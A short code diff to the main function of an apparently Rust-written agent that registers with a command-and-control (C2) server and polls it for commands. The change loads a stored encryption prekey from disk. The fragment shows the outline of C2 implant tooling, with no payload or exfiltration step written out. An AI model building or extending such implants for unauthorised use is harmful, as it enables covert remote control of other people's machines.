@@ -53,6 +53,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Register with C2 server (first run) or reload stored UUID (subsequent runs)
     let agent_id = register::get_or_register_agent_id(&api_client, &conf)?;
 
+    // Load the stable prekey from disk (ensures decryption uses the same key that was registered)
+    let mut conf = conf;
+    conf.private_prekey = register::load_stable_prekey()?;
+
     log::info!("Agent running as ID: {}", agent_id);
 
     // Start the C2 command polling loop (never returns)
